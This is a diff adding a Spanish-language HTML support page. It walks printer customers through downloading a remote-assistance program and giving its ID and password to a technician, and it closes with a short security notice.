@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Soporte remoto de impresoras</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f7fa;
+            margin: 0;
+            padding: 40px 20px;
+            color: #222;
+        }
+
+        .soporte {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 35px;
+            border-radius: 12px;
+            box-shadow: 0 3px 15px rgba(0,0,0,0.10);
+            text-align: center;
+        }
+
+        h1 {
+            margin-top: 0;
+            font-size: 28px;
+        }
+
+        .intro {
+            font-size: 18px;
+            line-height: 1.5;
+        }
+
+        .pasos {
+            text-align: left;
+            margin: 30px 0;
+        }
+
+        .paso {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 20px;
+        }
+
+        .numero {
+            background: #0066cc;
+            color: white;
+            min-width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 12px;
+        }
+
+        .texto {
+            font-size: 17px;
+            line-height: 1.4;
+        }
+
+        .boton {
+            display: inline-block;
+            background: #0066cc;
+            color: white;
+            padding: 18px 30px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .boton:hover {
+            background: #0052a3;
+        }
+
+        .aviso {
+            margin-top: 25px;
+            background: #f0f4f8;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="soporte">
+
+    <h1>🖨️ Soporte para su impresora</h1>
+
+    <p class="intro">
+        Si nuestro técnico le ha indicado que necesita asistencia remota,
+        descargue el programa de soporte y siga los pasos.
+    </p>
+
+    <div class="pasos">
+
+        <div class="paso">
+            <div class="numero">1</div>
+            <div class="texto">
+                Pulse el botón <strong>“Descargar soporte”</strong>.
+            </div>
+        </div>
+
+        <div class="paso">
+            <div class="numero">2</div>
+            <div class="texto">
+                Cuando termine la descarga, abra el archivo
+                <strong>Soporte_Impresora.exe</strong>.
+                <br>
+                <small>
+                    No es necesario instalar el programa.
+                </small>
+            </div>
+        </div>
+
+        <div class="paso">
+            <div class="numero">3</div>
+            <div class="texto">
+                En la ventana que aparecerá, dígale al técnico
+                el <strong>ID</strong> y la <strong>contraseña</strong>
+                que aparecen en pantalla.
+            </div>
+        </div>
+
+    </div>
+
+    <a class="boton"
+       href="/descargas/Soporte_Impresora.exe"
+       download="Soporte_Impresora.exe">
+        ⬇️ Descargar soporte
+    </a>
+
+    <div class="aviso">
+        <strong>🔒 Seguridad</strong><br>
+        El programa solo se utiliza para que nuestro técnico pueda
+        ayudarle con su impresora. La conexión termina cuando usted
+        cierra el programa.
+        <br><br>
+        <strong>No abra este programa si no está hablando con nuestro servicio técnico.</strong>
+    </div>
+
+</div>
+
+</body>
+</html>
